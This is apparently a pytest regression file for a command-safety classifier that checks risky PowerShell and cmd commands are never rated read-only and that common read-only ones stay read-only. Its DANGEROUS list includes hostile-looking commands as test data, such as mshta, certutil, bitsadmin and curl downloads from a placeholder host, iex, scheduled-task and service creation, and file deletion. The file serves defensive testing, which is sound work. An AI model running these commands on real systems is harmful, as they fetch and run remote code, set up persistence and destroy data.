# -*- coding: utf-8 -*-
"""命令闸门回归矩阵：危险写法不得判只读；常见只读命令不得被误伤。"""
import pytest
from canaan_security_policy import READONLY, classify_command

DANGEROUS = [
    'Write-Output "$(Set-Content C:\\Temp\\x.txt x)"',
    'Write-Host "$(Start-Process calc)"',
    'Get-Date "$(Remove-Item C:\\Temp\\x.txt)"',
    '$x = Start-Process calc',
    '${x} = Start-Process calc',
    '$script:x = Start-Process calc',
    '$env:x = "1"',
    '$x = & { Start-Process calc }',
    'Write-Output @"\n$(Set-Content C:\\Temp\\x.txt x)\n"@',
    '[Environment]::Exit(0)',
    '[System.IO.File]::WriteAllText("C:\\Temp\\x.txt","x")',
    '[Diagnostics.Process]::Start("calc")',
    '[scriptblock]::Create("Start-Process calc").Invoke()',
    'Invoke-Expression "Start-Process calc"',
    'iex "Start-Process calc"',
    'Add-Type -TypeDefinition "..."',
    'New-Object Net.WebClient',
    'Start-Job { Start-Process calc }',
    'Register-ScheduledTask -TaskName x -Action (New-ScheduledTaskAction -Execute calc)',
    'schtasks /create /tn x /tr calc /sc once /st 00:00',
    'reg add HKCU\\Software\\X /v a /d 1 /f',
    'sc create x binPath= C:\\x.exe',
    'wmic process call create calc',
    'mshta http://example.invalid/x.hta',
    'certutil -urlcache -split -f http://example.invalid/x C:\\Temp\\x',
    'bitsadmin /transfer x http://example.invalid/x C:\\Temp\\x',
    'curl http://example.invalid/x -o C:\\Temp\\x',
    'cmd /c start calc',
    'powershell -Command Start-Process calc',
    'del C:\\Temp\\x.txt',
    'ri C:\\Temp\\x.txt',
    'Set-Content C:\\Temp\\x x',
    'Out-File C:\\Temp\\x',
    'Get-ChildItem | Remove-Item',
    'Get-Process | Stop-Process',
    'Get-Process | % { $_.Kill() }',
]

BENIGN = [
    'Get-Content "$env:TEMP\\a.txt"',
    'Get-Process | Where-Object { $_.CPU -gt 1 }',
    'Get-CimInstance Win32_LogicalDisk | ForEach-Object { [math]::Round($_.FreeSpace/1GB,2) }',
    'Get-Date -Format "yyyy-MM-dd"',
    'Write-Output "hello"',
    "Write-Output '$x = 1'",
    'Get-ChildItem -Path . -Filter *.py',
    'Test-Path "C:\\Temp"',
    'Get-Item "C:\\Temp" | Select-Object Name',
    "Get-Content 'a;b|c.txt'",
    'Get-Process | Sort-Object WS -Descending | Select-Object -First 5',
    'hostname; whoami',
    'ping baidu.com -n 2',
    'ipconfig /all',
    'tasklist | findstr chrome',
    'Get-PSDrive C | Select-Object Used,Free',
    'Resolve-DnsName github.com',
    'Get-ChildItem C:\\ -Depth 1',
    'Get-Content "C:\\a=b.txt"',
]


@pytest.mark.parametrize("cmd", DANGEROUS)
def test_dangerous_never_readonly(cmd):
    d = classify_command(cmd)
    assert d.level != READONLY, (cmd, d.level, d.reason)


@pytest.mark.parametrize("cmd", BENIGN)
def test_benign_stays_readonly(cmd):
    d = classify_command(cmd)
    assert d.level == READONLY, (cmd, d.level, d.reason)
